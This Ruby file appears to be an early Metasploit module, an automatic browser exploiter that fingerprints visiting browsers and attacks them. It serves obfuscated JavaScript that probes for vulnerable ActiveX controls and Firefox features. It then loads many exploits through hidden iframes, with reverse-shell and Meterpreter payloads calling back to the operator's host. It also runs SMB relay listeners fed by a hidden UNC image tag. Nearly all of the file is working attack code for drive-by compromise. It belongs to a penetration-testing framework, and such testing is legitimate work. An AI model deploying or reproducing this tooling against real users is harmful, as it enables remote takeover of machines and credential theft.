##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'rex/exploitation/javascriptosdetect.rb'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info, 
			'Name'        => 'HTTP Client Automatic Exploiter',
			'Version'     => '$Revision$',
			'Description' => %q{
					This module uses a combination of client-side and server-side techniques to
				fingerprint HTTP clients and then automatically exploit them.
				},
			'Author'      => 
				[
					'egypt <egypt[at]metasploit.com>',  # initial concept, integration and extension of Jerome's os_detect.js
					'Jerome Athias'                     # advanced Windows OS detection in javascript
				],
			'License'     => BSD_LICENSE,
			'Actions'     =>
				[
				 	[ 'WebServer' ]
				],
			'PassiveActions' => 
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options([
			OptAddress.new('LHOST', [true, 'The IP address to use for reverse-connect payloads']),
			OptPort.new('LPORT', [false, 'The starting TCP port number for reverse-connect payloads', 4444])
		], self.class)

		@exploits = Hash.new
	end
	
	def init_exploit(name, targ = 0)
		targ ||= 0
		case name
		when %r{exploit/windows}
			payload='windows/meterpreter/reverse_tcp'
		else
			payload='generic/shell_reverse_tcp'
		end	
		@exploits[name] = framework.modules.create(name)
		@exploits[name].datastore['SRVPORT'] = datastore['SRVPORT']

		# For testing, set the exploit uri to the name of the exploit so it's
		# easy to tell what is happening from the browser.
		# XXX: Comment this out for release
		#@exploits[name].datastore['URIPATH'] = name  

		@exploits[name].datastore['LPORT']   = @lport
		@exploits[name].datastore['LHOST']   = @lhost
		@exploits[name].exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => targ,
			'Payload'        => payload,
			'RunAsJob'       => true)

		@lport += 1
	end

	def setup() 
		super
		@lport = datastore['LPORT'] || 4444
		@lhost = datastore['LHOST']
		@lport = @lport.to_i
		print_status("Starting exploit modules on host #{@lhost}...")

		##
		# Start all the exploit modules
		##

		# TODO: add an Automatic target to all of the Firefox exploits

		# Firefox < 1.0.5
		# requires javascript
		# currently only has a windows target
		init_exploit('exploit/multi/browser/mozilla_compareto')

		# Firefox < 1.5.0.5
		# requires java
		# requires javascript
		# Has targets for Windows, Linux x86, MacOSX x86/PPC, no auto
		init_exploit('exploit/multi/browser/mozilla_navigatorjava')

		# Firefox < 1.5.0.1
		# For now just use the default target of Mac.
		# requires javascript
		# Has targets for MacOSX PPC and Linux x86, no auto
		init_exploit('exploit/multi/browser/firefox_queryinterface')

		# works on iPhone 
		# does not require javascript
		init_exploit('exploit/osx/armle/safari_libtiff')

		# untested
		#init_exploit('exploit/osx/browser/software_update')
		# untested
		#init_exploit('exploit/windows/browser/ani_loadimage_chunksize')

		# does not require javascript
		init_exploit('exploit/windows/browser/apple_quicktime_rtsp')

		# requires javascript
		init_exploit('exploit/windows/browser/novelliprint_getdriversettings')

		# Works on default IE 6
		# Doesn't work on Windows 2000 SP0 IE 5.0
		# I'm pretty sure keyframe works on everything this works on, but since
		# this doesn't need javascript, try it anyway.
		# does not require javascript
		init_exploit('exploit/windows/browser/ms03_020_ie_objecttype')

		# requires javascript
		init_exploit('exploit/windows/browser/ie_createobject')

		# I'm pretty sure keyframe works on everything this works on and more,
		# so for now leave it out.
		# requires javascript
		# init_exploit('exploit/windows/browser/ms06_055_vml_method')

		# Works on default IE 5 and 6
		# requires javascript 
		# ActiveXObject('DirectAnimation.PathControl')
		# classid D7A7D7C3-D47F-11D0-89D3-00A0C90833E6
		init_exploit('exploit/windows/browser/ms06_067_keyframe')

		# only works on IE with XML Core Services
		# requires javascript
		# classid 88d969c5-f192-11d4-a65f-0040963251e5
		init_exploit('exploit/windows/browser/ms06_071_xml_core')

		# Pops up whatever client is registered for .pls files.  It's pretty
		# obvious to the user when this exploit loads, so leave it out for now.
		# does not require javascript
		#init_exploit('exploit/windows/browser/winamp_playlist_unc')


		# untested
		init_exploit('exploit/windows/browser/systemrequirementslab_unsafe')
		# untested
		init_exploit('exploit/windows/browser/lpviewer_url')
		# untested
		init_exploit('exploit/windows/browser/softartisans_getdrivename')
		# untested
		init_exploit('exploit/windows/browser/ms08_053_mediaencoder')
		# untested
		init_exploit('exploit/windows/browser/macrovision_unsafe')


		#
		# Requires UNC path which only seems to work on IE in my tests
		#
		
		# Launch a smb_relay module on port 139
		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
		smbr_mod.datastore['LHOST']   = @lhost
		smbr_mod.datastore['LPORT']   = (@lport += 1)
		smbr_mod.datastore['SRVPORT'] = 139
		smbr_mod.datastore['AutoRunScript'] = 'migrate'
		smbr_mod.exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => 'windows/meterpreter/reverse_tcp',
			'RunAsJob'       => true)

		# Launch a second one with port 445
		smbr_mod = framework.modules.create('exploit/windows/smb/smb_relay')
		smbr_mod.datastore['LHOST']   = @lhost
		smbr_mod.datastore['LPORT']   = (@lport += 1)
		smbr_mod.datastore['SRVPORT'] = 445
		smbr_mod.datastore['AutoRunScript'] = 'migrate'
		smbr_mod.exploit_simple(
			'LocalInput'     => self.user_input,
			'LocalOutput'    => self.user_output,
			'Target'         => 0,
			'Payload'        => 'windows/meterpreter/reverse_tcp',
			'RunAsJob'       => true)
			
		@myhost = datastore['SRVHOST']
		@myport = datastore['SRVPORT']

	end

	def on_request_uri(cli, request) 
		print_status("Request '#{request.uri}' from #{cli.peerhost}:#{cli.peerport}")

		# Create a cached mapping between IP and detected target
		@targetcache ||= {}
		@targetcache[cli.peerhost] ||= {}
		@targetcache[cli.peerhost][:update] = Time.now.to_i

		##
		# Clean the cache -- remove hosts that we haven't seen for more than 60
		# seconds
		##
		rmq = []
		@targetcache.each_key do |addr|
			if (Time.now.to_i > @targetcache[addr][:update]+60)
				rmq.push addr
			end
		end
		rmq.each {|addr| @targetcache.delete(addr) }
		#--
	
		case request.uri
			when %r{^#{datastore['URIPATH']}.*sessid=}
				record_detection(cli, request)
				send_not_found(cli)
			when self.get_resource
				#
				# This is the request for exploits.  At this point all we know
				# about the target came from the useragent string which could
				# have been spoofed, so let the javascript figure out which 
				# exploits to run.  Record detection based on the useragent in  
				# case javascript is disabled on the target.
				#

				record_detection(cli, request)
				print_status("Responding with exploits")

				response = build_sploit_response(cli, request)
				response['Expires'] = '0'
				response['Cache-Control'] = 'must-revalidate'
				
				cli.send_response(response)
			else
				print_error("I don't know how to handle this request (#{request.uri}), sending 404")
				send_not_found(cli)
				return false
		end
	end

	def run
		exploit()
	end

	def build_sploit_response(cli, request)
		if (!@targetcache[cli.peerhost]) 
			record_detection(cli, request)
		end
			
		response = create_response()

		objects = []

		objects += [ 
			[ 'DirectAnimation.PathControl',            'KeyFrame', exploit_resource('exploit/windows/browser/ms06_067_keyframe') ],
			[ 'LPViewer.LPViewer.1',                    'URL', exploit_resource('exploit/windows/browser/lpviewer_url') ],
			[ '{88D969C5-F192-11D4-A65F-0040963251E5}', 'SetRequestHeader', exploit_resource('exploit/windows/browser/ms06_071_xml_core') ],
			[ '{36723F97-7AA0-11D4-8919-FF2D71D0D32C}', 'GetDriverSettings', exploit_resource('exploit/windows/browser/novelliprint_getdriversettings') ],
			[ '{BD96C556-65A3-11D0-983A-00C04FC29E36}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{BD96C556-65A3-11D0-983A-00C04FC29E30}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
			[ '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
			[ '{6414512B-B978-451D-A0D8-FCFDF33E833C}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{06723E09-F4C2-43C8-8358-09FCD1DB0766}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{639F725F-1B2D-4831-A9FD-874847682010}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{BA018599-1DB3-44F9-83B4-461454C84BF8}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{E8CCCDDF-CA28-496B-B050-6C07C962476B}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ], 
			[ '{0006F033-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
			[ '{0006F03A-0000-0000-C000-000000000046}', 'CreateObject', exploit_resource('exploit/windows/browser/ie_createobject') ],
			[ '{67A5F8DC-1A4B-4D66-9F24-A704AD929EEE}', 'Init', exploit_resource('exploit/windows/browser/systemrequirementslab_unsafe') ],
			[ '{A8D3AD02-7508-4004-B2E9-AD33F087F43C}', 'GetDetailsString', exploit_resource('exploit/windows/browser/ms08_053_mediaencoder') ],
		]
		objects = objects.map{ |arr| "new Array('#{arr[0]}', '#{arr[1]}', '#{arr[2]}')," }.join("\n").chop

		js = <<-ENDJS
			var DEBUGGING = false;

			#{js_os_detect}
			#{js_base64}
			if (!(typeof(debug)== 'function')) {
				function debug(msg) {
					if (DEBUGGING) {
						document.writeln(msg);
					}
				}
			}

			function send_detection_report(detected_version) {
				// ten chars long and all uppercase so we can't possibly step
				// on a real version string.
				var cruft = "#{Rex::Text.rand_text_alpha_upper(10)}"; 
				var encoded_detection;
				try { xmlhr = new XMLHttpRequest(); }
				catch(e) {
					try { xmlhr = new ActiveXObject("Microsoft.XMLHTTP"); }
					catch(e) {
						xmlhr = new ActiveXObject("MSXML2.ServerXMLHTTP");
					}
				}
				if (! xmlhr) {
					return(0);
				}
				encoded_detection =  new String();
				encoded_detection += detected_version.os_name + cruft;
				encoded_detection += detected_version.os_flavor + cruft;
				encoded_detection += detected_version.os_sp + cruft;
				encoded_detection += detected_version.os_lang + cruft;
				encoded_detection += detected_version.arch + cruft;
				encoded_detection += detected_version.browser_name + cruft;
				encoded_detection += detected_version.browser_version;
				while (-1 != encoded_detection.indexOf(cruft)) {
					encoded_detection = encoded_detection.replace(cruft, ":");
				}
				//debug(encoded_detection + "<br>");
				encoded_detection = Base64.encode(encoded_detection);
				//debug(encoded_detection + "<br>");
				xmlhr.open("GET", document.location + "?sessid=" + encoded_detection, false);
				xmlhr.send(null);
			}

			function BodyOnLoad() {
				var sploit_frame = '';
				var body_elem = document.getElementById('body_id');
				var detected_version = getVersion();

				try {
					// This function doesn't seem to get created on old
					// browsers (specifically, Firefox 1.0), so until I
					// can puzzle out why, wrap it in a try block so the
					// javascript parser doesn't crap out and die before
					// any exploits get sent.
					send_detection_report(detected_version);
				} catch (e) {}

				if ("#{HttpClients::IE}" == detected_version.browser_name) {
					//debug("This is IE<br />");
					var object_list = new Array(#{objects});
					var vuln_obj;
					var written_frames = new Array();

					// iterate through our list of exploits 
					debug("I have " + object_list.length + " objects to test <br />");
					for (var current_object in object_list) {
						debug("Testing for object " + current_object + " ... ");
						// Don't write the same iframe more than once.  This is
						// only an issue with ie_createobject which uses a ton of
						// different classids to perform the same exploit.
						// Assumes that no url will be a substring of another url.
						if (-1 != written_frames.toString().indexOf(object_list[current_object][2])) {
							debug("Already wrote an iframe for " + object_list[current_object][0] +"<br>");
							continue;
						}
						vuln_obj = '';
						if (object_list[current_object][0].substring(0,1) == '{') {
							var name = object_list[current_object][0].substring( 1, object_list[current_object][0].length - 1 );
							//debug("which is a classid <br />");

							// classids are stored surrounded in braces for an easy way to tell 
							// them from ActiveX object names, so if it has braces, strip them 
							// out and create an object element with that classid
							vuln_obj = document.createElement("object");
							vuln_obj.setAttribute("classid", "clsid:" + name);

							vuln_obj.setAttribute("id", name);
						} else {
							// otherwise, try to create an AXO with that name
							try { 
								vuln_obj = new ActiveXObject(object_list[current_object][0]);
							} catch(e){ 
								vuln_obj = '';
							}
							debug("did ActiveXObject("+ object_list[current_object][0] +") and i got a "+ typeof(vuln_obj) +"<br>");
						}
						// javascript lets us access method names like array
						// elements, so obj.foo is the same as obj['foo']
						// However, ActiveX objects created with an 
						// <object classid="..."> tag don't advertise their methods 
						// the same way other objects do, i.e., in the example
						// above, foo does not show up in 
						//     for (var method in obj) { ... } 
						// It's still there, you just can't see it.  Unfortunately,
						// there is no method that all ActiveX objects must
						// implement, so as far as I can tell, there is no generic
						// way to determine if the object is available.  The 
						// solution is to check for the existence of a method we
						// know based on the exploit, e.g. in the case of 
						// windows/browser/ie_createobject, CreateObject() must
						// exist.  Methods that don't exist have a 
						// typeof == 'undefined' whereas exported ActiveX object 
						// methods have a typeof == 'unknown' 
						if (typeof(vuln_obj[object_list[current_object][1]]) == 'unknown') {
							// then we're golden, write the evil iframe
							sploit_frame += '#{build_iframe("' + object_list[current_object][2] + '")}';
							// array.push() is not cross-platform 
							written_frames[written_frames.length] = object_list[current_object][2];
						//} else if (typeof(vuln_obj[object_list[current_object][1]]) != 'undefined') {
						//	eval("alert(typeof(vuln_obj."+ object_list[current_object][1] +"));");
						}
					} // end for each exploit
				} // end if IE
				else {
					//debug("this is NOT MSIE<br />");
					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_navigatorjava'))}';
					} else {
						//debug("NO exploit/multi/browser/mozilla_navigatorjava");
					}
					if (window.InstallVersion) {
						sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/mozilla_compareto'))}';
					} else {
						//debug("NO exploit/multi/browser/mozilla_compareto");
					}
					// eventually this exploit will have an auto target and
					// this check won't be necessary
					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
						if (location.QueryInterface) {
							sploit_frame += '#{build_iframe(exploit_resource('exploit/multi/browser/firefox_queryinterface'))}';
						}
					}
				}
				if (0 < sploit_frame.length) {
					// This is isn't working in IE6.  Revert to document.write
					// until we can come up with something better
					//body_elem.innerHTML += sploit_frame;
					document.writeln(sploit_frame);
				}
			} // function BodyOnLoad
			window.onload = BodyOnLoad;
		ENDJS
		opts = {
			# Strings obfuscation still needs more testing
			'Strings' => true,
			'Symbols' => {
				'Variables' => [
					'current_object',
					'body_elem', 'body_id', 
					'object_list', 'vuln_obj', 
					'obj_elem', 'sploit_frame',
					'cruft', 'written_frames',
					'detected_version', 'xmlhr',
					'encoded_detection'
				],
				'Methods'   => [
					'Hash', 'BodyOnLoad', 
					'send_detection_report'
				]
			}
		}

		js = ::Rex::Exploitation::ObfuscateJS.new(js, opts)
		js.update_opts(js_os_detect.opts)
		js.update_opts(js_base64.opts)
		js.obfuscate()

		body  = "<body id=\"#{js.sym('body_id')}\">"

		body << "<h1> Loading, please wait... </h1>"

		# 
		# These are non-javascript exploits, send them with all requests in
		# case the ua is spoofed and js is turned off
		#
		
		body << "<!--[if lt IE 7]>"
		body << build_iframe(exploit_resource('exploit/windows/browser/ms03_020_ie_objecttype'))
		#body << "Internet Explorer &lt; version 7"
		body << "<![endif]-->"

		# image for smb_relay 
		share_name = Rex::Text.rand_text_alpha(rand(10) + 5) 
		img_name = Rex::Text.rand_text_alpha(rand(10) + 5) + ".jpg"
		body << %Q{
			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
		}
		body << "<div id=\"osx-non-js\">"
		body << build_iframe(exploit_resource('exploit/windows/browser/apple_quicktime_rtsp'))
		body << build_iframe(exploit_resource('exploit/osx/armle/safari_libtiff'))
		body << "</div>"

		response.body = ' <html > <head > <title > Loading </title> '
		response.body << ' <script language="javascript" type="text/javascript" >'
		response.body << " <!--\n" + js + ' //-->'
		response.body << ' </script> </head> ' + body 

		response.body << " </body> </html> "

		return response
	end

	# consider abstracting this out to a method (probably
	# with a different name) of Auxiliary::Report or
	# Exploit::Remote::HttpServer
	def record_detection(cli, request)
		os_name = nil
		os_flavor = nil
		os_sp = nil
		os_lang = nil
		arch = nil
		ua_name = nil
		ua_vers = nil

		data_offset = request.uri.index('sessid=')
		if (data_offset.nil? or -1 == data_offset) 
			print_status("Recording detection from User-Agent")
			# then we didn't get a report back from our javascript
			# detection; make a best guess effort from information 
			# in the user agent string.  The OS detection should be
			# roughly the same as the javascript version because it
			# does most everything with navigator.userAgent

			ua = request['User-Agent']
			# always check for IE last because everybody tries to
			# look like IE
			case (ua)
				when /Version\/(\d+\.\d+\.\d+).*Safari/
					ua_name = HttpClients::SAFARI
					ua_vers  = $1
				when /Firefox\/((:?[0-9]+\.)+[0-9]+)/
					ua_name = HttpClients::FF
					ua_vers  = $1
				when /Mozilla\/[0-9]\.[0-9] \(compatible; MSIE ([0-9]\.[0-9]+)/
					ua_name = HttpClients::IE
					ua_vers  = $1
			end
			case (ua)
				when /Windows/
					os_name = OperatingSystems::WINDOWS
					arch = ARCH_X86
				when /Linux/
					os_name = OperatingSystems::LINUX
				when /iPhone/
					os_name = OperatingSystems::MAC_OSX
					arch = 'armle'
				when /Mac OS X/
					os_name = OperatingSystems::MAC_OSX
			end
			case (ua)
				when /Windows 95/
					os_flavor = '95'
				when /Windows 98/
					os_flavor = '98'
				when /Windows NT 4/
					os_flavor = 'NT'
				when /Windows NT 5.0/
					os_flavor = '2000'
				when /Windows NT 5.1/
					os_flavor = 'XP'
				when /Windows NT 5.2/
					os_flavor = '2003'
				when /Windows NT 6.0/
					os_flavor = 'Vista'
				when /Gentoo/
					os_flavor = 'Gentoo'
				when /Debian/
					os_flavor = 'Debian'
				when /Ubuntu/
					os_flavor = 'Ubuntu'
			end
			case (ua)
				when /PPC/
					arch = ARCH_PPC
				when /i.86/
					arch = ARCH_X86
			end

			print_status("Browser claims to be #{ua_name} #{ua_vers}, running on #{os_name} #{os_flavor}")
		else
			print_status("Recording detection from JavaScript")
			data_offset += 'sessid='.length
			detected_version = request.uri[data_offset, request.uri.length]
			if (0 < detected_version.length)
				detected_version = Rex::Text.decode_base64(Rex::Text.uri_decode(detected_version))
				print_status("Report: #{detected_version}")
				(os_name, os_flavor, os_sp, os_lang, arch, ua_name, ua_vers) = detected_version.split(':')
			end
		end
		arch ||= ARCH_X86

		report_host(
			:host       => cli.peerhost,
			:os_name    => os_name,
			:os_flavor  => os_flavor, 
			:os_sp      => os_sp, 
			:os_lang    => os_lang, 
			:arch       => arch,
			:ua_name    => ua_name,
			:ua_vers    => ua_vers
		)
		report_note(
			:host       => cli.peerhost,
			:type       => 'http_request',
			:data       => "#{@myhost}:#{@myport} #{request.method} #{request.resource} #{os_name} #{ua_name} #{ua_vers}"
		)

	end

	def report_host(opts)

		@targetcache[opts[:host]][:os_name]   = opts[:os_name]
		@targetcache[opts[:host]][:os_flavor] = opts[:os_flavor]
		@targetcache[opts[:host]][:os_sp]     = opts[:os_sp]
		@targetcache[opts[:host]][:os_lang]   = opts[:os_lang]
		@targetcache[opts[:host]][:arch]      = opts[:arch]
		@targetcache[opts[:host]][:ua_name]   = opts[:ua_name]
		@targetcache[opts[:host]][:ua_vers]   = opts[:ua_vers]

		super(opts)
	end
	
	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_os(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.os_name
		elsif @targetcache[cli.peerhost] and @targetchace[cli.peerhost][:os_name]
			res = @targetcache[cli.peerhost][:os_name]
		else
			res = OperatingSystems::UNKNOWN
		end
		return res
	end

	# This or something like it should probably be added upstream in Msf::Exploit::Remote
	def get_target_arch(cli)
		if framework.db.active
			host = framework.db.get_host(nil, cli.peerhost)
			res = host.arch
		elsif @targetcache[cli.peerhost][:arch]
			res = @targetcache[cli.peerhost][:arch]
		else
			res = ARCH_X86
		end
		return res
	end

	def build_iframe(resource)
		ret = ''
		#ret << "<p>#{resource}</p>"
		ret << "<iframe src=\"#{resource}\" style=\"visibility:hidden\" height=\"0\" width=\"0\" border=\"0\"></iframe>"
		return ret
	end

	def exploit_resource(mod)
		if (@exploits[mod])
			return @exploits[mod].get_resource
		else
			return "404.html"
		end
	end
end
